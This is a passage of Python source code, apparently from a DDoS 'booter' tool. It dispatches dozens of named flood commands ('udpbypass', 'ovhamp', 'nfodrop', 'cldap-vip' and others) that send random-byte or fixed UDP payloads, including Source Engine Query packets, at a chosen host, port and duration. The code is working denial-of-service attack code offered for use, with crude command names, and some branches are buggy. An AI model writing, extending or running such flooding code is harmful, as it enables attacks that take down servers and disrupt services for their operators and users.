					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 666
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 20000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpdown":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 102400
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-vip":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cldap-vip":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					byte = 102400
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, timer, port, byte)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-vip":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					byte = 666
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, timer, port, byte)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
